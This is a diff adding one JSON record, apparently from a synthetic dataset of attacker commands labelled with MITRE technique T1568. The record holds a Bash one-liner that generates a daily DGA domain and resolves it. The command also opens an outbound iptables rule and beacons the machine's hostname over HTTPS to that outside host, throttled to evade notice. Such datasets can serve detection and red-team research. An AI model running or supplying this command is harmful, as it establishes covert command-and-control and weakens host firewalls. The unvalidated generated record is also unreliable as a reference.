@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'd=$(date -u +%Y%m%d | sha256sum | cut -c1-12).cdn-updater.org; ans=$(dig +nocmd +noall +answer \"$d\" A | head -n1); ip=$(awk \"{print $5}\" <<<\"$ans\"); ttl=$(awk \"{print $2}\" <<<\"$ans\"); [ -n \"$ip\" ] && { iptables -D OUTPUT -p tcp -d \"$ip\" --dport 443 -j ACCEPT 2>/dev/null; iptables -I OUTPUT -p tcp -d \"$ip\" --dport 443 -j ACCEPT; curl -fsS --speed-time 2 --speed-limit 10 \"https://$d:443/ping?ttl=$ttl&host=$(hostname)\"; }'",
+  "explanation": "Resolves a DGA domain and extracts the TTL to time communications. It updates iptables to allow outbound 443 to the resolved IP and beacons with rate controls to appear irregular yet benign.",
+  "rationale_steps": [
+    "Create a daily DGA domain",
+    "Resolve A record and parse IP and TTL",
+    "Refresh iptables rule to target the current resolved IP",
+    "Beacon over HTTPS with throttled traffic to blend in"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-10f87baa-b1a03cd9",
+  "source_prompt_hash": "10f87baa",
+  "timestamp_utc": "2025-09-30T09:41:35.067898Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
